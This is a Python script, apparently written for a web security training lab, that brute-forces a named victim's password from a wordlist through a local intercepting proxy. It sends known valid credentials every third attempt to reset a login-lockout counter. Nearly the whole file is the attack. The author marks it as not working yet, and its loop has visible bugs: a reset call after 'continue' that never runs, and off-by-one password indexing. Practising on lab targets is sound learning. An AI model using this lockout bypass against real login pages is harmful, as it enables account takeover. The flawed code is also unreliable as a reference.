
import requests
import sys
import urllib3
import time
# not working yet :"


proxies = { 
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080",
}


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def send_valid_creds(url:str):
    login_url = url +'/login'
    params = {
            "username":"wiener",
            "password":"peter"
            }
    r = requests.post(login_url , verify=False , proxies=proxies , data=params)


    
def brute_force_password(url:str,username:str):
    login_url = url+'/login'
    with open("./passwds",'r') as passwords_file:
        passwords = [password.rstrip() for password in passwords_file]
        
    index = 0
    num = 1
    while index < 100:
        if (num) %3 == 0 :
            # we need to send valid creds to reset the counter 
            send_valid_creds(url)


        params = {
            "username":username,
            "password":passwords[num]
            }
        r = requests.post(login_url , verify=False , proxies=proxies , data=params )

        if r.is_redirect:
            print(f"(+) Valid creds username: {username} , password: {passwords[num]}")
        if "You have made too many incorrect login attempts. Please try again in 1 minute(s)." in r.text:
            print("Our SCript is not running properly") 
            # we need to send valid creds to reset the counter 
            time.sleep(60)
            continue
            send_valid_creds(url)

        index +=1
        num +=1



def main():
    if len(sys.argv) !=3:
        print(f"(-) Usage {sys.argv[0]} http://example.com/login victim_username")
        sys.exit(-1)

    url = sys.argv[1]
    username = sys.argv[2]
    brute_force_password(url,username)

if __name__ =="__main__":
    
    main()